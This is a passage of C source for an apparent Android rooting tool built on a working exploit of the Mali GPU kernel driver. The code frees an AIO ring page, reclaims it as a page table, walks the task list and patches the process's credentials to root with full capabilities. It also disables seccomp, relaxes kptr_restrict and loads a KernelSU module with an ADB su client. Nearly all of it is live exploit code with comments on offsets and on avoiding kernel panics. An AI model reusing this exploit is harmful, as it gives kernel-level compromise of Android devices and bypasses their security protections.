        rp(r, "kmsg: %s\n",
           line + (strlen(line) > 170 ? strlen(line) - 170 : 0));
        shown++;
      }
  }
  return rc;
}

/* An existing module may already have started its services through another
 * entry point. Never replay post-fs-data merely because insmod returns EEXIST. */
static int ksu_loaded(void) {
  FILE *f = fopen("/proc/modules", "r");
  char line[512];
  int found = 0;
  if (!f) return 0;
  while (fgets(line, sizeof line, f))
    if (strncmp(line, "kernelsu ", 9) == 0) { found = 1; break; }
  fclose(f);
  return found;
}

/* Explicit ADB mode, with an independent module and no KSU lifecycle. */
static char adb_console_params[256];
static int load_adb_module(void *kbuf, size_t ksize, const char *ko_path,
                           const char *loader, const struct chiroru_profile *prof,
                           struct rpt *r) {
  char patched[512], source[512];
  char temporary[] = "/data/local/tmp/.chiroru-su-XXXXXX";
  uint64_t stext = 0;
  int in = -1, out = -1, node = -1, sysctl = -1, rc = -1, restore_kptr = 0;
  char old_kptr[8] = {0};
  ssize_t old_kptr_len = 0;
  const char label[] = "u:object_r:shell_data_file:s0";
  /* Some user builds hide addresses even from root. Scope the relaxation to
   * relocation/loading, and restore the original setting on every exit. */
  sysctl = open("/proc/sys/kernel/kptr_restrict", O_RDWR | O_CLOEXEC);
  if (sysctl < 0) goto done;
  old_kptr_len = read(sysctl, old_kptr, sizeof old_kptr - 1);
  if (old_kptr_len < 1 || old_kptr[0] < '0' || old_kptr[0] > '2') goto done;
  rp(r, "adb_root: kptr_restrict before=%c\n", old_kptr[0]);
  restore_kptr = old_kptr[0] != '0';
  if (restore_kptr && (lseek(sysctl, 0, SEEK_SET) < 0 || write(sysctl, "0", 1) != 1)) goto done;
  stext = kallsyms_stext();
  rp(r, "adb_root: _stext=0x%llx\n", (unsigned long long)stext);
  /* Both ADB modules import only the two SELinux data symbols, regardless
   * of how many additional symbols the profile's KernelSU module needs. */
  if (!stext || !ko_path ||
      patch_vendor_syms(kbuf, ksize, stext, prof, 2, r)) goto done;
  if (snprintf(source, sizeof source, "%s.client", ko_path) >= (int)sizeof source) goto done;
  if (prof->direct_adb) {
    /* The factory userspace is 32-bit and has no linker64, so the bundled
     * aarch64 ksud cannot run. Resolve the module's text symbols here and call
     * init_module directly; the kernel resolves exported data symbols. */
    if (patch_module_symbols(kbuf, ksize, r)) goto done;
    errno = 0;
    if (syscall(__NR_init_module, kbuf, (unsigned long)ksize, "") != 0) {
      if (errno != EEXIST) {
        rp(r, "adb_root: init_module errno=%d (%s)\n", errno, strerror(errno));
        goto done;
      }
      rp(r, "adb_root: module already loaded\n");
    }
  } else {
    if (!loader) goto done;
    if (snprintf(patched, sizeof patched, "%s.patched", ko_path) >= (int)sizeof patched) goto done;
    out = open(patched, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0600);
    if (out < 0 || write(out, kbuf, ksize) != (ssize_t)ksize) goto done;
    close(out); out = -1;
    if (run_ksud(loader, patched, adb_console_params, r)) goto done;
  }
  /* devtmpfs/ueventd creates the node asynchronously. Keep this bounded. */
  for (int i = 0; i < 100; ++i) {
    node = open(CHIRORU_ADB_DEVICE, O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
    if (node >= 0) break;
    usleep(10000);
  }
  if (node < 0 || fchown(node, 0, 2000) || fchmod(node, 0664) ||
      fsetxattr(node, "security.selinux", CHIRORU_ADB_NODE_CONTEXT, sizeof(CHIRORU_ADB_NODE_CONTEXT), 0) ||
      ioctl(node, CHIRORU_ADB_INFO, 0) != CHIRORU_ADB_VERSION) goto done;
  in = open(source, O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
  out = mkstemp(temporary);
  if (in < 0 || out < 0) goto done;
  char buf[8192];
  ssize_t n;
  while ((n = read(in, buf, sizeof buf)) > 0) {
    ssize_t used = 0;
    while (used < n) {
      ssize_t written = write(out, buf + used, n - used);
      if (written < 0 && errno == EINTR) continue;
      if (written <= 0) goto done;
      used += written;
    }
  }
  if (n < 0 || fchown(out, 0, 2000) || fchmod(out, 0755) ||
      fsetxattr(out, "security.selinux", label, sizeof label, 0) || fsync(out)) goto done;
  if (rename(temporary, "/data/local/tmp/chiroru-su")) goto done;
  rp(r, "adb_root: module and client installed\n");
  rc = 0;
done:
  if (rc) rp(r, "adb_root: setup failed errno=%d (%s)\n", errno, strerror(errno));
  if (restore_kptr) {
    if (lseek(sysctl, 0, SEEK_SET) < 0 || write(sysctl, old_kptr, old_kptr_len) != old_kptr_len) {
      rp(r, "adb_root: failed to restore kptr_restrict errno=%d\n", errno);
      rc = -1;
    } else rp(r, "adb_root: kptr_restrict restored=%c\n", old_kptr[0]);
  }
  if (sysctl >= 0) close(sysctl);
  if (in >= 0) close(in);
  if (out >= 0) close(out);
  if (node >= 0) close(node);
  unlink(temporary);
  return rc;
}

/* Android 11 installs packages either directly in /data/app or one directory
 * below it. Resolve only the exact manager package, without following links.
 * The module independently verifies the APK certificate and package UID. */
static int factory_manager_path(const char *directory, int depth,
                                char *out, size_t capacity) {
  DIR *dir = opendir(directory);
  struct dirent *entry;
  int found = 0;
  if (!dir) return 0;
  while ((entry = readdir(dir))) {
    char child[1024];
    struct stat st;
    const char *name = entry->d_name;
    if (name[0] == '.' || strspn(name,
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._~+=-") != strlen(name)) continue;
    if (snprintf(child, sizeof child, "%s/%s", directory, name) >= (int)sizeof child ||
        lstat(child, &st) || !S_ISDIR(st.st_mode)) continue;
    if (!strncmp(name, "com.rifsxd.ksunext-", strlen("com.rifsxd.ksunext-"))) {
      char apk[1024];
      if (snprintf(apk, sizeof apk, "%s/base.apk", child) >= (int)sizeof apk ||
          lstat(apk, &st) || !S_ISREG(st.st_mode) || strlen(apk) >= capacity) continue;
      if (found) { found = -1; break; }
      strcpy(out, apk);
      found = 1;
    } else if (depth > 0) {
      char nested[1024];
      int n = factory_manager_path(child, depth - 1, nested, sizeof nested);
      if (n < 0 || (n && found)) { found = -1; break; }
      if (n && strlen(nested) < capacity) { strcpy(out, nested); found = 1; }
    }
  }
  closedir(dir);
  return found;
}

static int load_factory_ksu(void *kbuf, size_t ksize, const char *ksud_path,
                            int run_hooks, const struct chiroru_profile *prof,
                            uint64_t stext_hint, struct rpt *r) {
  char apk[1024], params[1200], old_kptr[8] = {0};
  uint64_t phys = 0, stext;
  int sysctl = -1, restore = 0, rc = -1;
  ssize_t old_len = 0;
  if (ksu_loaded()) {
    rp(r, "module: kernelsu already loaded; lifecycle skipped\n");
    return 0;
  }
  if (!ksud_path || access(ksud_path, X_OK) ||
      factory_manager_path("/data/app", 1, apk, sizeof apk) != 1) {
    rp(r, "factory KSU: install the matching armv7 manager before loading\n");
    return -1;
  }
  sysctl = open("/proc/sys/kernel/kptr_restrict", O_RDWR | O_CLOEXEC);
  if (sysctl < 0) goto done;
  old_len = read(sysctl, old_kptr, sizeof old_kptr - 1);
  if (old_len < 1 || old_kptr[0] < '0' || old_kptr[0] > '2') goto done;
  restore = old_kptr[0] != '0';
  if (restore && (lseek(sysctl, 0, SEEK_SET) < 0 || write(sysctl, "0", 1) != 1)) goto done;
  stext = stext_hint ? stext_hint : kallsyms_stext();
  if (!stext || kernel_phys_base(&phys) ||
      patch_vendor_syms(kbuf, ksize, stext, prof, prof->vendor_count, r) ||
      patch_module_symbols(kbuf, ksize, r)) goto done;
  if (snprintf(params, sizeof params,
      "ksu_phys_base=0x%llx allow_shell=1 manager_apk=%s",
      (unsigned long long)phys, apk) >= (int)sizeof params) goto done;
  if (syscall(__NR_init_module, kbuf, (unsigned long)ksize, params)) {
    rp(r, "factory KSU: init_module errno=%d (%s)\n", errno, strerror(errno));
    goto done;
  }
  rp(r, "module: kernelsu loaded\n");
  rc = 0;
done:
  if (restore && (lseek(sysctl, 0, SEEK_SET) < 0 || write(sysctl, old_kptr, old_len) != old_len)) {
    rp(r, "factory KSU: failed to restore kptr_restrict\n");
    rc = -1;
  }
  if (sysctl >= 0) close(sysctl);
  if (!rc && run_hooks) {
    rc = run_lifecycle_as_ksu(ksud_path, r);
    rp(r, "lifecycle: status=%s\n", rc == 0 ? "complete" : "failed");
  }
  return rc;
}

static int load_module_relaxed(void *kbuf, size_t ksize, const char *ko_path,
                               const char *ksud_path, int run_hooks,
                               const struct chiroru_profile *prof, uint64_t stext_hint,
                               struct rpt *r) {
  uint64_t phys = 0;
  char params[128];

  if (ksu_loaded()) {
    rp(r, "module: kernelsu already loaded\n");
    rp(r, "lifecycle hooks skipped: existing module; reboot to load the bundled update\n");
    return 0;
  }

  if (kernel_phys_base(&phys) != 0) {
    rp(r, "module: cannot read /proc/iomem\n");
    return -1;
  }
  rp(r, "module: ksu_phys_base=0x%llx\n", (unsigned long long)phys);
  snprintf(params, sizeof params,
           "ksu_phys_base=0x%llx allow_shell=1", (unsigned long long)phys);

  if (ksud_path && ksud_path[0] && ko_path && access(ksud_path, X_OK) == 0) {
    char patched[256];
    uint64_t stext = stext_hint ? stext_hint : kallsyms_stext();
    int fd;
    rp(r, "module: _stext=0x%llx\n", (unsigned long long)stext);
    if (stext) patch_vendor_syms((void *)kbuf, ksize, stext, prof,
                                 prof->vendor_count, r);
    snprintf(patched, sizeof patched, "%s.patched", ko_path);
    fd = open(patched, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) { rp(r, "module: create %s errno=%d\n", patched, errno); return -1; }
    if (write(fd, kbuf, ksize) != (ssize_t)ksize) {
      rp(r, "module: short write errno=%d\n", errno);
      close(fd);
      return -1;
    }
    close(fd);
    rp(r, "module: delegating to ksud\n");
    {
      int rc = run_ksud(ksud_path, patched, params, r);
      if (rc != 0 && ksu_loaded()) {
        rp(r, "module: kernelsu already loaded\n");
        rp(r, "lifecycle hooks skipped: module loaded concurrently\n");
        return 0;
      }
      if (rc == 0 && run_hooks) {
        rc = run_lifecycle_as_ksu(ksud_path, r);
        rp(r, "lifecycle: status=%s\n", rc == 0 ? "complete" : "failed");
      } else if (rc == 0) {
        rp(r, "lifecycle hooks explicitly skipped\n");
      }
      return rc;
    }
  }
  rp(r, "module: no ksud, patching symbol table directly\n");
  if (patch_module_symbols(kbuf, ksize, r) != 0) return -1;

  /* /dev/kmsg returns only messages produced after the last read, so drain it
   * first and then report exactly what this load attempt logged. */
  {
    int kfd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
    char kb[8192];
    while (kfd >= 0 && read(kfd, kb, sizeof kb) > 0) { }

    errno = 0;
    long rc = syscall(__NR_init_module, kbuf, (unsigned long)ksize, params);
    int saved = errno;
    rp(r, "init_module rc=%ld errno=%d (%s)\n", rc, rc < 0 ? saved : 0,
       rc < 0 ? strerror(saved) : "ok");

    if (rc != 0 && kfd >= 0) {
      int n, shown = 0;
      char *save, *line;
      char all[8192];
      size_t used = 0;
      while ((n = (int)read(kfd, kb, sizeof kb)) > 0 && used + n < sizeof all) {
        memcpy(all + used, kb, n);
        used += n;
      }
      all[used] = 0;
      for (line = strtok_r(all, "\n", &save); line && shown < 10;
           line = strtok_r(NULL, "\n", &save)) {
        if (strstr(line, "module") || strstr(line, "kernelsu") ||
            strstr(line, "Unknown symbol") || strstr(line, "vermagic") ||
            strstr(line, "reloc")) {
          rp(r, "kmsg: %s\n", line + (strlen(line) > 190 ? strlen(line) - 190 : 0));
          shown++;
        }
      }
    }
    if (kfd >= 0) close(kfd);
    return rc == 0 ? 0 : -1;
  }
}

/* ksud resolves undefined symbols through /proc/kallsyms, which kptr_restrict
 * hides. Relax it for the load and restore the previous value afterwards, so
 * a KernelSU boot does not leave kernel pointers readable by every app. */
static int load_module(void *kbuf, size_t ksize, const char *ko_path,
                       const char *ksud_path, int run_hooks,
                       const struct chiroru_profile *prof, uint64_t stext_hint,
                       struct rpt *r) {
  char old_kptr[8] = {0};
  ssize_t old_len = 0;
  int sysctl = -1, restore = 0, rc;

  if (run_hooks == -1) return load_adb_module(kbuf, ksize, ko_path, ksud_path, prof, r);
  if (prof->direct_ksu) return load_factory_ksu(kbuf, ksize, ksud_path, run_hooks, prof, stext_hint, r);
  if (ksu_loaded()) return load_module_relaxed(kbuf, ksize, ko_path, ksud_path,
                                               run_hooks, prof, stext_hint, r);

  sysctl = open("/proc/sys/kernel/kptr_restrict", O_RDWR | O_CLOEXEC);
  if (sysctl >= 0) {
    old_len = read(sysctl, old_kptr, sizeof old_kptr - 1);
    if (old_len < 1 || old_kptr[0] < '0' || old_kptr[0] > '2') {
      close(sysctl);
      sysctl = -1;
    } else {
      restore = old_kptr[0] != '0';
      if (restore && (lseek(sysctl, 0, SEEK_SET) < 0 ||
                      write(sysctl, "0", 1) != 1)) {
        rp(r, "module: cannot relax kptr_restrict errno=%d\n", errno);
        close(sysctl);
        return -1;
      }
    }
  }

  rc = load_module_relaxed(kbuf, ksize, ko_path, ksud_path, run_hooks, prof,
                           stext_hint, r);

  if (restore) {
    errno = 0;
    if (lseek(sysctl, 0, SEEK_SET) == 0 &&
        write(sysctl, old_kptr, old_len) == old_len) {
      rp(r, "module: kptr_restrict restored=%c\n", old_kptr[0]);
    } else {
      int saved = errno;
      if (restore_kptr_as_ksu(old_kptr[0]) == 0) {
        rp(r, "module: kptr_restrict restored=%c (ksu domain)\n", old_kptr[0]);
      } else {
        rp(r, "module: failed to restore kptr_restrict errno=%d\n", saved);
        rc = -1;
      }
    }
  }
  if (sysctl >= 0) close(sysctl);
  return rc;
}

/*
 * One attempt: everything from the kbase handshake to the cred/seccomp patch,
 * plus the optional module load. Returns 0 on success, negative otherwise.
 * The reclaim step is a race, so this is called in a loop by mali36449_root().
 */
static int attempt_once(const struct chiroru_profile *prof,
                        const void *kbuf, size_t ksize, int kfd,
                        const char *ko_path, const char *ksud_path,
                        int run_hooks, struct rpt *r, int *stage) {
  int fd = -1, ret = -1, found = 0, found_block = -1, i;
  struct kbase_ioctl_version_check ver = {.major = 11, .minor = 21};
  struct kbase_ioctl_set_flags ctx = {.create_flags = 0};
  union kbase_ioctl_mem_import mi;
  struct base_mem_import_user_buffer ub;
  struct base_external_resource ex;
  struct base_jd_atom_v2 atom;
  void *event = MAP_FAILED, *imp = MAP_FAILED, *res = MAP_FAILED;
  void *spray_base = MAP_FAILED;
  size_t spray_len = 0;
  unsigned long aio = 0;
  u64 event_gpu = 0, imp_gpu = 0, cookie = 0, commit = ~0ULL;
  uint64_t entries[RS_ENTRIES];
  struct rs_result rs;
  uint64_t lbase = 0, table0 = 0, stext_va = 0;
  uint64_t init_page_pa = prof->init_task_pa & ~0xfffULL;
  uint64_t init_lbase_raw = (prof->init_task_pa & 0xfffULL) + T_TASKS;
  uint64_t init_walk_raw = (prof->init_task_pa & 0xfffULL) + T_TASKS_PREV;
  volatile uint64_t *table = NULL;

  memset(&mi, 0, sizeof mi);
  *stage = 0;   /* nothing in the kernel touched yet: a retry is safe */

  prctl(PR_SET_NAME, "maliapp", 0, 0, 0);
  {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);
  }

  fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
  if (fd < 0) { rp(r, "FAIL open mali0 errno=%d\n", errno); goto out; }
  if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &ver) < 0) {
    rp(r, "FAIL VERSION_CHECK errno=%d\n", errno); goto out;
  }
  rp(r, "api=%u.%u\n", ver.major, ver.minor);
  if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &ctx) < 0) {
    rp(r, "FAIL SET_FLAGS errno=%d\n", errno); goto out;
  }
  /* Tracking page: the driver requires this mapping before normal ioctls
   * (offset 3 << PAGE_SHIFT). Without it MEM_ALLOC answers EINVAL. */
  {
    void *tr = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
                    (off_t)(3ULL << 12));
    if (tr == MAP_FAILED) {
      rp(r, "FAIL tracking mmap errno=%d\n", errno);
      goto out;
    }
    rp(r, "tracking ok %p\n", tr);
  }

  if (alloc_page(fd, &event, &event_gpu)) {
    rp(r, "FAIL MEM_ALLOC errno=%d\n", errno); goto out;
  }

  {
    char mi[256] = {0};
    int mf = open("/proc/meminfo", O_RDONLY);
    if (mf >= 0) { int n = (int)read(mf, mi, sizeof(mi)-1); if (n>0) mi[n]=0; close(mf); }
    {
      char *p1 = strstr(mi, "MemAvailable");
      if (p1) { char *e = strchr(p1, '\n'); if (e) *e = 0; rp(r, "meminfo: %s\n", p1); }
    }
  }

  /* Reserve the spray before the ring page is freed. */
  {
    size_t total = BLOCK_BYTES * (size_t)SPRAY_BLOCKS + BLOCK_BYTES;
    uintptr_t start, aligned;
    char *base;
    res = mmap(NULL, total, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (res == MAP_FAILED) { rp(r, "FAIL spray mmap errno=%d\n", errno); goto out; }
    start = (uintptr_t)res;
    aligned = (start + BLOCK_BYTES - 1) & ~(uintptr_t)(BLOCK_BYTES - 1);
    if (aligned > start) munmap((void *)start, aligned - start);
    if (aligned + BLOCK_BYTES * (size_t)SPRAY_BLOCKS < start + total)
      munmap((void *)(aligned + BLOCK_BYTES * (size_t)SPRAY_BLOCKS),
             (start + total) - (aligned + BLOCK_BYTES * (size_t)SPRAY_BLOCKS));
    base = (char *)aligned;
    spray_base = base;
    spray_len = BLOCK_BYTES * (size_t)SPRAY_BLOCKS;
    *(volatile u64 *)base = 0x5741524dULL;
    memset(base + PAGE_BYTES, 0x33, PAGE_BYTES);
    memset(base + 2 * PAGE_BYTES, 0x33, PAGE_BYTES);
  }

  if (syscall(__NR_io_setup, RING_EVENTS, &aio) < 0) {
    rp(r, "FAIL io_setup errno=%d\n", errno); goto out;
  }
  rp(r, "aio ring mapped at 0x%lx\n", aio);
  memcpy((void *)aio + RING_MARK_OFF, RING_MARK, sizeof(RING_MARK));

  ub.ptr = (u64)(uintptr_t)aio;
  ub.length = PAGE_BYTES;
  mi.in.flags = IMPORT_FLAGS;
  mi.in.phandle = (u64)(uintptr_t)&ub;
  mi.in.type = BASE_MEM_IMPORT_TYPE_USER_BUFFER;
  if (ioctl(fd, KBASE_IOCTL_MEM_IMPORT, &mi) < 0) {
    rp(r, "FAIL MEM_IMPORT errno=%d\n", errno); goto out;
  }
  cookie = mi.out.gpu_va;
  rp(r, "import cookie=0x%llx flags=0x%llx va_pages=%llu, about to mmap\n",
     (unsigned long long)cookie, (unsigned long long)mi.out.flags,
     (unsigned long long)mi.out.va_pages);
  imp = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
             (off_t)cookie);
  rp(r, "mmap import -> %p errno=%d\n", imp, imp == MAP_FAILED ? errno : 0);
  if (imp == MAP_FAILED) { rp(r, "FAIL mmap import errno=%d\n", errno); goto out; }
#if defined(__arm__)
  imp_gpu = cookie;
#else
  imp_gpu = (u64)(uintptr_t)imp;
#endif
  if (query(fd, imp_gpu, &commit)) { rp(r, "FAIL MEM_QUERY\n"); goto out; }
  rp(r, "import gpu_va=0x%llx commit=%llu\n", (unsigned long long)imp_gpu,
     (unsigned long long)commit);

  /* Do NOT touch the imported page yet: commit is 0 until the GPU atom pins it,
   * and a read before that is SIGBUS (BUS_ADRERR). rootsh reads only after
   * commit == 1. */

  memset(&atom, 0, sizeof atom);
  atom.atom_number = 1;
  atom.core_req = BASE_JD_REQ_EXTERNAL_RESOURCES | SOFT_EVENT_WAIT;
  atom.jc = event_gpu;
  atom.extres_list = (u64)(uintptr_t)&ex;
  atom.nr_extres = 1;
  ex.ext_resource = imp_gpu;
  rp(r, "submit pin atom (jc=0x%llx ext=0x%llx)\n",
     (unsigned long long)event_gpu, (unsigned long long)imp_gpu);
  {
    int sr = submit(fd, &atom);
    rp(r, "submit -> %d errno=%d\n", sr, errno);
    if (sr) goto out;
  }
  {
    int wr = wait_commit(fd, imp_gpu, 1, 3000);
    rp(r, "wait_commit(1) -> %d\n", wr);
    if (wr) goto out;
  }

  /* Decisive check: read the alias while the page is still pinned. If this
   * faults, the alias mapping itself is broken in an app process. */
  {
    volatile u8 *q = (volatile u8 *)imp;
    rp(r, "pinned read imp[0]=0x%02x imp[0x800]=0x%02x\n", q[0], q[RING_MARK_OFF]);
  }

  memset(&atom, 0, sizeof atom);
  atom.atom_number = 2;
  atom.core_req = SOFT_EVENT_SET;
  atom.jc = event_gpu;
  {
    int sr = submit(fd, &atom);
    rp(r, "submit unpin -> %d errno=%d\n", sr, errno);
    if (sr) goto out;
    rp(r, "event1 -> %d\n", event_read(fd, 3000));
    rp(r, "event2 -> %d\n", event_read(fd, 3000));
    rp(r, "wait_commit(0) -> %d\n", wait_commit(fd, imp_gpu, 0, 3000));
  }

  rp(r, "io_destroy...\n");
  if (chiroru_aio_destroy(&aio) < 0) { rp(r, "FAIL io_destroy\n"); goto out; }
  rp(r, "ring freed, sleeping\n");
  usleep(200000);
  rp(r, "first stale read...\n");

  /* Reclaim the freed page as an L3 PTE table. */
  {
    char *base = (char *)spray_base;
    for (i = 1; i < SPRAY_BLOCKS; i++) {
      char *p = base + (size_t)i * BLOCK_BYTES;
      *(volatile u64 *)p = 0x52444359ULL | ((u64)i << 32);
      memset(p + PAGE_BYTES, 2, PAGE_BYTES);
      memset(p + 2 * PAGE_BYTES, 2, PAGE_BYTES);
      memcpy(entries, imp, sizeof(entries));
      if (i == 1) rp(r, "stale read ok, entries[0]=0x%llx\n",
                    (unsigned long long)entries[0]);
      if (rs_is_marker_table(entries, 3, 0, &rs)) {
        found = 1;
        found_block = i;
        break;
      }
    }
  }
  if (!found) { rp(r, "RECLAIM_NONE\n"); goto out; }
  rp(r, "RECLAIM_OK block=%d\n", found_block);

  table = (volatile uint64_t *)imp;
  table0 = table[0];
  {
    volatile uint8_t *slot0 =
        (volatile uint8_t *)((char *)spray_base +
                             (size_t)found_block * BLOCK_BYTES);
    /* Closing a PTE does not invalidate the CPU's cached translation.
     * Every physical mapping in this attempt needs a fresh virtual slot. */
    int next_slot = 3;

    if (prof->image_size) {
      /* A candidate's physical load address must match the live Image header
       * before reading globals or modifying any credentials. */
      int slot = next_slot++;
      volatile uint8_t *p = win_open(table, slot, table0, prof->image_pa, slot0);
      uint64_t size = 0, text_offset = 0;
      uint32_t magic = 0;
      if (!p) { rp(r, "FAIL no entry for Image header\n"); goto out; }
      memcpy(&text_offset, (const void *)(p + 8), 8);
      memcpy(&size, (const void *)(p + 16), 8);
      memcpy(&magic, (const void *)(p + 56), 4);
      win_close(table, slot);
      if (magic != 0x644d5241U || size != prof->image_size || text_offset != 0x80000ULL) {
        rp(r, "FAIL kernel Image header does not match the OTA profile\n");
        goto out;
      }
    }

    if (prof->use_magic_lbase) {
      /* Legacy profile: init_task.tasks.next minus a calibrated physical
       * offset.  The offset is only valid for this exact build. */
      int slot = next_slot++;
      volatile uint8_t *p = win_open(table, slot, table0, init_page_pa, slot0);
      uint64_t next = 0;
      if (!p) { rp(r, "FAIL no free entry for lbase\n"); goto out; }
      memcpy(&next, (const void *)(p + init_lbase_raw), 8);
      win_close(table, slot);
      if (next < 0xffffff8000000000ULL) {
        rp(r, "FAIL init_task.next=0x%llx\n", (unsigned long long)next);
        goto out;
      }
      lbase = next - prof->lbase_magic;
      rp(r, "lbase=0x%llx (magic)\n", (unsigned long long)lbase);
    } else {
      /* KASLR-independent: read the kernel's own memstart_addr and
       * vabits_actual.  __phys_to_virt(x) = x - physvirt_offset and
       * physvirt_offset = memstart_addr - PAGE_OFFSET, so the linear-map
       * base is PAGE_OFFSET - memstart_addr. */
      const uint64_t pas[3] = {prof->memstart_addr_pa,
                               prof->vabits_actual_pa,
                               prof->kimage_voffset_pa};
      uint64_t vals[3] = {0, 0, 0};
      uint64_t page_off;
      for (int q = 0; q < 3; q++) {
        uint64_t pa = pas[q];
        int slot = next_slot++;
        volatile uint8_t *p = win_open(table, slot, table0,
                                       pa & ~0xfffULL, slot0);
        if (!p) { rp(r, "FAIL no entry for kernel base\n"); goto out; }
        memcpy(&vals[q], (const void *)(p + (pa & 0xfffULL)), 8);
        win_close(table, slot);
      }
      if (vals[1] < 32 || vals[1] > 52) {
        rp(r, "FAIL vabits_actual=%llu\n", (unsigned long long)vals[1]);
        goto out;
      }
      page_off = (uint64_t)(0ULL - (1ULL << vals[1]));
      lbase = page_off - vals[0];
      if ((lbase & 0xfffULL) || lbase < 0xffffff8000000000ULL) {
        rp(r, "FAIL implausible linear base=0x%llx (memstart=0x%llx)\n",
           (unsigned long long)lbase, (unsigned long long)vals[0]);
        goto out;
      }
      stext_va = vals[2] + prof->image_pa + 0x800ULL;
      rp(r, "lbase=0x%llx memstart=0x%llx vabits=%llu _stext=0x%llx\n",
         (unsigned long long)lbase, (unsigned long long)vals[0],
         (unsigned long long)vals[1], (unsigned long long)stext_va);
    }

    /* Walk the task list to our own task_struct. */
    {
      int k = next_slot, n;
      uint64_t va;
      uint64_t cur_cred = 0, cur_task_pa = 0;
      volatile uint8_t *p = win_open(table, k, table0, init_page_pa, slot0);
      if (!p) { rp(r, "FAIL no entry for walk\n"); goto out; }
      memcpy(&va, (const void *)(p + init_walk_raw), 8);
      win_close(table, k);
      k++;

      for (n = 0; n < 64 && k + 1 < RS_ENTRIES; n++) {
        uint64_t pa = va - lbase;
        uint64_t task_pa = pa - WALK_SUB;
        uint64_t page0 = task_pa & ~0xfffULL;
        uint64_t off = task_pa & 0xfffULL;
        uint8_t buf[0x1000 + 0x800];
        uint64_t prev, cred, real;
        uint32_t pid, tgid;
        char comm[17];

        if (!va || va < lbase || pa >= RS_PA_MAX) break;
        memset(buf, 0, sizeof buf);
        p = win_open(table, k, table0, page0, slot0);
        if (!p) break;
        memcpy(buf, (const void *)p, 0x1000);
        win_close(table, k);
        k++;
        if (off + 0x800 > 0x1000) {
          p = win_open(table, k, table0, page0 + 0x1000, slot0);
          if (!p) break;
          memcpy(buf + 0x1000, (const void *)p, 0x800);
          win_close(table, k);
          k++;
        }

        memcpy(&prev, buf + off + WALK_PREV_OFF, 8);
        memcpy(&pid, buf + off + T_PID, 4);
        memcpy(&tgid, buf + off + T_TGID, 4);
        memcpy(&cred, buf + off + T_CRED, 8);
        memcpy(&real, buf + off + T_REAL_CRED, 8);
        memcpy(comm, buf + off + T_COMM, 16);
        comm[16] = 0;

        if (pid == (uint32_t)syscall(__NR_gettid) || !strcmp(comm, "maliapp")) {
          cur_cred = cred;
          cur_task_pa = task_pa;
          rp(r, "task found n=%d pid=%u tgid=%u comm=%s cred=0x%llx "
                "(gettid=%d)\n", n, pid, tgid, comm, (unsigned long long)cred,
             (int)syscall(__NR_gettid));
          break;
        }
        va = prev;
      }
      if (!cur_cred) { rp(r, "FAIL own task not found\n"); goto out; }
#ifdef CHIRORU_READ_ONLY
      /* Development aid: prove the profile's read path (reclaim, linear-map
       * base, task walk) without patching credentials. Release builds never
       * define this. */
      rp(r, "read-only build: task found, stopping before any write\n");
      ret = 0;
      goto out;
#endif

      /* From here on the kernel state is modified: no retry allowed. */
      *stage = 1;

      /* Patch cred: uid/gid 0, full caps. */
      {
        uint64_t cpa = cur_cred - lbase;
        uint64_t cpage = cpa & ~0xfffULL;
        uint64_t coff = cpa & 0xfffULL;
        volatile uint8_t *cp;
        if (cpa >= RS_PA_MAX) { rp(r, "FAIL cred pa\n"); goto out; }
        cp = win_open(table, k, table0, cpage, slot0);
        if (!cp) { rp(r, "FAIL no entry for cred\n"); goto out; }
        rp(r, "cred pa=0x%llx uid_before=%u\n", (unsigned long long)cpa,
           *(volatile uint32_t *)(cp + coff + 0x04));
        for (i = 0; i < 9; i++)
          *(volatile uint32_t *)(cp + coff + 0x04 + (size_t)i * 4) = 0;
        *(volatile uint64_t *)(cp + coff + 0x30) = 0x3fffffffffULL;
        *(volatile uint64_t *)(cp + coff + 0x38) = 0x3fffffffffULL;
        *(volatile uint64_t *)(cp + coff + 0x40) = 0x3fffffffffULL;
        *(volatile uint64_t *)(cp + coff + 0x48) = 0;
        win_close(table, k);
        k++;
        rp(r, "cred patched uid=%d euid=%d caps=0x3fffffffff\n", getuid(),
           geteuid());
      }

      /* Disarm seccomp.
       *
       * The app filter is what kills the process with SIGSYS on init_module.
       * Do NOT touch task->seccomp.{mode,filter}: zeroing the mode leaves the
       * TIF_SECCOMP thread flag set, and syscall_trace_enter then calls
       * __secure_computing() which hits BUG() on the unknown mode and panics
       * the kernel on the very next syscall (observed twice).
       *
       * thread_info.flags sits at offset 0 of task_struct on this kernel and
       * syscall_trace_enter gates __secure_computing on bit 11:
       *     ldr  x8, [x20]        ; x20 == current
       *     tbnz w8, #0xb, __secure_computing
       * Clearing that bit is enough and leaves no inconsistent state.
       */
      {
        uint64_t fl_page = cur_task_pa & ~0xfffULL;
        uint64_t fl_off = cur_task_pa & 0xfffULL;
        volatile uint8_t *tp = win_open(table, k, table0, fl_page, slot0);
        if (tp) {
          uint64_t flags;
          memcpy(&flags, (const void *)(tp + fl_off), 8);
          rp(r, "task flags=0x%llx TIF_SECCOMP=%d\n",
             (unsigned long long)flags, (flags & TIF_SECCOMP) ? 1 : 0);
          /* Three writes, and all three are needed:
           *   - flags: so this thread stops entering __secure_computing;
           *   - seccomp.mode/filter: so fork()'s copy_seccomp() sees
           *     SECCOMP_MODE_DISABLED and does not re-arm TIF_SECCOMP in the
           *     child (an exec'd ksud would otherwise die on SYS_init_module
           *     with SIGSYS, which is exactly what happened).
           * mode == 0 with the flag still set is what BUG()s the kernel, so
           * the flag write must not be separated from the other two. */
          *(volatile uint32_t *)(tp + fl_off + T_SECCOMP_MODE) = 0;
          *(volatile uint64_t *)(tp + fl_off + T_SECCOMP_FILTER) = 0;
          *(volatile uint64_t *)(tp + fl_off) = flags & ~TIF_SECCOMP;
